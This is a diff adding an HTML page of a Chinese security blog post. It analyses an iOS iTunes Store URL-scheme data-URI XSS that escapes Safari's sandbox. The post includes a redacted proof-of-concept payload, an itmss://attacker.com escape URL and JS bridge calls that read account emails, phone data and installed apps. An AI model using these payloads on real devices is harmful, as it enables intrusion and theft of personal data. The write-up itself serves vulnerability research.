@@ -1,0 +1,315 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>客户端XSS | Remarkable</title><meta name="author" content="Small Waste"><meta name="copyright" content="Small Waste"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="PAC自从 iPhone Xs 使用了 A12 芯片正式加入了 PAC，包括老牌的 Pwn2Own 在内的各种 0day 竞赛上就没有出现过成功的挑战，直到 2020 年的天府杯。当时的蚂蚁安全和 360 政企安全分别用两套完全不同的方案实现了远程攻击，在搭载了 iOS 14.2 的系统上通过 Sa"><link rel="shortcut icon" href="https://s2.loli.net/2022/07/21/dTarQcplR5zGN4W.png"><link rel="canonical" href="https://www.xiaojingye.top/2022/07/21/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/pwa/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/pwa/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/pwa/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/pwa/16.png"/><link rel="mask-icon" href="/pwa/safari-pinned-tab.svg" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?86771261f70d87991b3ee29ce2dac0b1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"./search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '客户端XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-21 11:44:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="baidu-site-verification" content="codeva-j2TLeETEme" /><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/07/20/N1DLlaqMkj5fK7U.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-solid fa-image"></i><span> 图片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/07/20/tOoYKRE7fMVdb6x.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Remarkable</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-solid fa-image"></i><span> 图片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">客户端XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-21T03:25:16.000Z" title="发表于 2022-07-21 11:25:16">2022-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-21T03:44:04.097Z" title="更新于 2022-07-21 11:44:04">2022-07-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="客户端XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>自从 iPhone Xs 使用了 A12 芯片正式加入了 PAC，包括老牌的 Pwn2Own 在内的各种 0day 竞赛上就没有出现过成功的挑战，直到 2020 年的天府杯。当时的蚂蚁安全和 360 政企安全分别用两套完全不同的方案实现了远程攻击，在搭载了 iOS 14.2 的系统上通过 Safari 浏览器作为入口，绕过浏览器沙箱执行任意代码并窃取敏感信息。</p>
+<p>绝大多数的 full chain exploit 都是先获取沙箱内任意代码执行，再逃逸沙箱；本文用到链条非常特殊，先绕过沙箱向一个系统自带 App 注入任意 javascript 代码，然后直接在 app 中获取完全的 shellcode 执行，也就是和 App 同等的权限，可以访问 Apple ID、通讯录、摄像头等敏感的信息。</p>
+<p>更为有意思的是，在这个 js 环境中，不仅兼容已有的任何一个 WebKit 漏洞利用（无论是否是 JIT 类型的漏洞），还额外引入了攻击面。靠着额外的攻击面结合多个系统安全机制的绕过，最终可以实现任意代码执行。</p>
+<p>一个漏洞非常有意思，本质上是一个客户端的 XSS。但要找到这个 XSS，不仅 fuzz 行不通，哪怕是代码审计也得看二进制代码，也就是要求同时具备逆向工程和 web 漏洞的背景知识。光是反编译 dyld_shared_cache 就能劝退一大批人。</p>
+<p>输入向量是大家熟悉的 URL scheme。URL scheme 可以从浏览器跳转到本地 app，在跳转前会提示用户。但 iOS 在代码里硬编码了一个信任名单，可以免确认跳转：</p>
+<h3 id="Allow-List-of-MobileSafari"><a href="#Allow-List-of-MobileSafari" class="headerlink" title="Allow List of MobileSafari"></a>Allow List of MobileSafari</h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> -[_SFNavigationResult isRedirectToAppleServices(_SFNavigationResult</span><br><span class="line">*<span class="keyword">self</span>, SEL a2)</span><br><span class="line">&#123;</span><br><span class="line">bundle = <span class="keyword">self</span>-&gt;_externalApplication.bundleIdentifier;</span><br><span class="line"><span class="keyword">return</span> [bundle isEqualToString:<span class="string">@&quot;com.apple.AppStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.AppStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.MobileStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.Music&quot;</span>] </span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.news&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这给漏洞的利用带来了很大便利。</p>
+<p>早在 2014 年就有韩国黑客 lokihardt 在 Pwn2Own 上用过这个攻击面，通过一个特殊的 URL 在本地 app 打开了任意网址，结合另一个 WebKit 的 Use-After-Free 漏洞即可在沙箱外运行任意代码。第一步的逃逸很简单：</p>
+<blockquote>
+<p>itmss://attacker.com</p>
+</blockquote>
+<p>当时并没有限制域名，直接给一个 URL 就能打开。这个问题就是CVE-2014-8840。</p>
+<p>之后 iOS 加入了域名白名单。每次启动 iTunes Store 时都会拉取一个 XML 配置文件，只有后缀满足其中 trustedDomains 列表才会打开。然而紧接着又被打了一次，因为 lokihardt 找了个信任域名的 DOM xss。</p>
+<p>一开始准备时也没想到真要搞 iOS。当时同事搞定了一个 iOS 和 mac 通用的 WebKit 读写利用WebAudio 组件，后来用在 macOS 的项目上，需要过沙箱，我就想起这个免确认跳转逃逸的点：</p>
+<blockquote>
+<p>its.detect.openltunes</p>
+</blockquote>
+<p>然而测试发现 mac 上的应用已经换上了 WKWebView，意味着即使跳转过去任意代码执行，权限和 Safari 的无异。</p>
+<h3 id="全局开启-iOS-Mac-的WebView调试"><a href="#全局开启-iOS-Mac-的WebView调试" class="headerlink" title="全局开启 iOS/Mac 的WebView调试"></a>全局开启 iOS/Mac 的WebView调试</h3><p>全局调试工具起到很大用处。随手在控制台里测试了一些代码就找到了一个 UAF。开始逆向代码，又发现 WebView 里隐藏的各种强大的接口，可以直接弹计算器。最后考虑效果最佳化，还是完全使用 iTunes 的漏洞完成了 iOS 的项目利用测试。</p>
+<p>一开始的思路放在信任域的 XSS 上，但被动扫描器看了几天也没进展。又掏出 IDA 在漫天的代码里看，终于在这几个方法里发现了彩蛋。</p>
+<p>· -[SUStoreController handleApplicationURL:]<br>· -[NSURL storeURLType]<br>· -[SUStoreController _handleAccountURL:]<br>· -[SKUIURL initWithURL:]</p>
+<p>iTunes Store 本地有一个逻辑，当 querystring 出现特殊的参数时，URL 的 hostname 就会被忽略掉，而是直接取出参数里的第二个 url，在一个浮层里加载：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">itms://&lt;马赛克&gt;&amp;url=http://www.apple.com</span><br></pre></td></tr></table></figure><br>在这里 URL 仍然具有域名信任检查，但已不要求使用 https，可以中间人了。让人不解的是，在反编译代码里发现了一段神奇的逻辑。当参数是一个 data URI 时，同样认为这是一个受信任的域。</p>
+<p>data URI 可以直接插入任意 html，所以这个点就变成了一个反射型 XSS，还是必须要逆向才能找到的 XSS。</p>
+<p>程序还有一个逻辑是会尝试对 querystring 的参数重新赋值，最终的 data URI 永远会被贴上一个额外的问号字符。如果使用 base64 编码，payload 就会被破坏掉；而 text/plain 不受影响，只是会在 body 结尾多出来一个字符而已。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toDataURI</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;data:text/html;,&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">this</span>).<span class="title function_">replace</span>(<span class="regexp">/[!&#x27;()*]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">payload</span>(<span class="params"></span>) &#123;  </span><br><span class="line">  iTunes.<span class="title function_">alert</span>(<span class="string">&#x27;gotcha&#x27;</span>); <span class="comment">// do ya thing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> data = <span class="string">`&lt;script type=&quot;application/javascript&quot;&gt;(<span class="subst">$&#123;payload&#125;</span>)()&lt;\/script&gt;`</span>.<span class="title function_">toDataURI</span>()</span><br><span class="line"><span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;itms://&lt;redacted&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// part of the PoC is redacted to prevent abuse</span></span><br><span class="line">url.<span class="property">searchParams</span>.<span class="title function_">set</span>(<span class="string">&#x27;url&#x27;</span>, data);</span><br><span class="line">location = url</span><br></pre></td></tr></table></figure>
+<p>因此通过以上简单的参数构造，就可以生成这样的一个特殊的 itms URL，能从 Safari 直接跳转到本地应用并执行任意 js。</p>
+<p>由于漏洞从 iOS 3 引入，直到 iOS 14.4 才被修复，影响范围过于夸张，以上提供的 PoC 并不是完整的。一些关键参数已被删除。</p>
+<p>在 iOS 14 上，这个 iTunes 具有 dynamic-codesigning 权限。有一些 iOS 程序员会误认为只有 WKWebView 才能使用 just-in-time 优化，但是实际上这只跟 JavaScriptCore 当前所在进程是否有特殊的 entitlement 来控制。</p>
+<p>这样一来这个 XSS 之后进入了一个特殊的环境。渲染的控件叫 SUWebView，是过时的 UIWebView 的子类，没有独立的渲染器进程。然而这个环境允许 JIT，所以有机会加载任意 shellcode。任意一个有效的 WebKit 的漏洞都可以在这个 WebView 被利用。</p>
+<p>除此之外，SUWebView 本身用的 JavaScript bridge 引入了新的攻击面，至少在这一步可以直接用 js 获取相当多的信息。</p>
+<p>SUWebView 使用的是过时的 WebScripting API，将 SUScriptInterface 类的方法导出到 js 上下文中。这些 API 被放在全局作用域的 iTunes 命名空间里。<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tunes.systemVersion() <span class="comment">//获取系统版本号</span></span><br><span class="line">iTunes.primaryAccount?.identifier <span class="comment">//获取 App Store 账号的邮箱</span></span><br><span class="line">iTunes.primaryiCloudAccount?.identifier <span class="comment">//获取 iCloud 账号的邮箱</span></span><br><span class="line">iTunes.diskSpaceAvailable() <span class="comment">//存储可用空间</span></span><br><span class="line">iTunes.telephony <span class="comment">//电话号码、运营商等信息</span></span><br><span class="line">iTunes.installedSoftwareApplications <span class="comment">//所有已安装的 app 信息</span></span><br></pre></td></tr></table></figure><br>另外从这个 WebView 向任意域名发起 HTTP 请求，都会带上额外的 AppStore 认证信息，包括 icloud-dsid, x-mme-client-info, x-apple-adsid, x-apple-i-md-m, x-apple-i-md 等。</p>
+<p>利用上述漏洞可以是的Safari绕过验证程序跳转到任意app执行一次触摸操作，多次执行便可通过iMessage向他人发送恶意代码实现传播。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = iTunes.<span class="title function_">softwareApplicationWithBundleID_</span>(<span class="string">&#x27;com.apple.calculator&#x27;</span>)app.<span class="title function_">launchWithURL_options_suspended_</span>(<span class="string">&#x27;calc://1337&#x27;</span>, &#123;&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.xiaojingye.top">Small Waste</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.xiaojingye.top/2022/07/21/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS/">https://www.xiaojingye.top/2022/07/21/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.xiaojingye.top" target="_blank">Remarkable</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/iOS/">iOS</a><a class="post-meta__tags" href="/tags/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8/">移动应用</a></div><div class="post_share"><div class="social-share" data-image="https://developer.apple.com/xcode/images/screen-lighter-large_2x.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/22/Linked-list-foundation-C-language-description/"><img class="prev-cover" src="https://s2.loli.net/2022/07/22/crACJQ1HYVb5tm8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linked list foundation - C language description</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/20/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%9D%B4%E8%9D%B6%E6%95%88%E5%BA%94/"><img class="next-cover" src="https://s2.loli.net/2022/07/20/BwJUu7anDK2EAzR.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">访问控制&amp;蝴蝶效应</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/08/03/checkm8-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="checkm8 攻击原理浅析"><img class="cover" src="https://www.apple.com.cn/newsroom/images/product/app-store/Apple_around-the-clock-global-effort-to-keep-App-Store-users-safe_spot-illo-1_050621_inline.jpg.large_2x.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-03</div><div class="title">checkm8 攻击原理浅析</div></div></a></div><div><a href="/2022/08/13/CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127-0-0-1/" title="CVE-2020-8558-跨主机访问127.0.0.1"><img class="cover" src="https://www.apple.com.cn/newsroom/images/product/os/standard/Apple-WWDC22-announcement-hero_big.jpg.large_2x.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-13</div><div class="title">CVE-2020-8558-跨主机访问127.0.0.1</div></div></a></div><div><a href="/2022/07/22/ssh-%E9%9A%A7%E9%81%93%E5%8F%8D%E5%BC%B9shell/" title="利用ssh 隧道反弹shell"><img class="cover" src="https://www.apple.com.cn/newsroom/images/live-action/wwdc-2022/Apple-WWDC22-fraud-prevention-hero_big.jpg.large_2x.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-22</div><div class="title">利用ssh 隧道反弹shell</div></div></a></div><div><a href="/2022/07/20/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%9D%B4%E8%9D%B6%E6%95%88%E5%BA%94/" title="访问控制&amp;蝴蝶效应"><img class="cover" src="https://s2.loli.net/2022/07/20/BwJUu7anDK2EAzR.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-20</div><div class="title">访问控制&amp;蝴蝶效应</div></div></a></div><div><a href="/2023/01/25/Java%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5/" title="Java安全编码-用户输入"><img class="cover" src="https://www.apple.com.cn/newsroom/images/live-action/wwdc-2021/Apple_Developer-Tools-hero-animation-clip_060721.jpg.landing-regular_2x.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-25</div><div class="title">Java安全编码-用户输入</div></div></a></div><div><a href="/2023/01/23/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E5%88%86%E6%9E%90/" title="Nginx解析漏洞深入利用及分析"><img class="cover" src="https://www.apple.com.cn/newsroom/images/passions/education/Apple-STEAM-Day-hero_Full-Bleed-Image.jpg.large_2x.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-23</div><div class="title">Nginx解析漏洞深入利用及分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/07/20/N1DLlaqMkj5fK7U.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Small Waste</div><div class="author-info__description">Blog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/akrnp98K/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/akrnp98K" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1735409005@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1735409005&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">认真上班是不可能的，这辈子都是不可能的。 只能靠摸摸鱼来混点底薪……</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PAC"><span class="toc-number">1.</span> <span class="toc-text">PAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Allow-List-of-MobileSafari"><span class="toc-number">1.0.1.</span> <span class="toc-text">Allow List of MobileSafari</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%BC%80%E5%90%AF-iOS-Mac-%E7%9A%84WebView%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">全局开启 iOS&#x2F;Mac 的WebView调试</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/02/Good-night-Mr-Lawrence/" title="Good night Mr. Lawrence"><img src="https://bu.dusays.com/2023/04/02/642994002b206.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Good night Mr. Lawrence"/></a><div class="content"><a class="title" href="/2023/04/02/Good-night-Mr-Lawrence/" title="Good night Mr. Lawrence">Good night Mr. Lawrence</a><time datetime="2023-04-02T14:45:08.000Z" title="发表于 2023-04-02 22:45:08">2023-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" 